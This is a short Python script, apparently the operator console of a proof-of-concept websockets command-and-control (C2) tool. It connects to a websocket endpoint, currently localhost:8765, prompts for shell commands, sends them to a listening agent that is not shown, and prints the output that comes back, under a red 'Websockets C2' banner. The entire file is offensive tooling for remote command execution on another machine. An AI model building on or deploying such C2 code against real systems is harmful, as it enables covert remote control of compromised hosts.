#!/usr/bin/env python
# Command execution PoC 
# ZephrFIsh

import asyncio
import websockets

# Colours
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))

async def sendCMDs():
    uri = "ws://localhost:8765"
    cmd = ''
    while cmd != 'exit':
        async with websockets.connect(uri) as websocket:
            prRed("[!] Websockets C2 [!]")
            cmd = input("Enter Command To Run: ")
            await websocket.send(cmd)
            prYellow(f"Sending {cmd}")
            cmd_output = await websocket.recv()
            await websocket.send(cmd_output)
            
            prCyan("Output from Command: ")
            prGreen(f"Received: {cmd_output}")
    else:
        prRed("Exit command received, exitting...")
        exit()
       

asyncio.get_event_loop().run_until_complete(sendCMDs())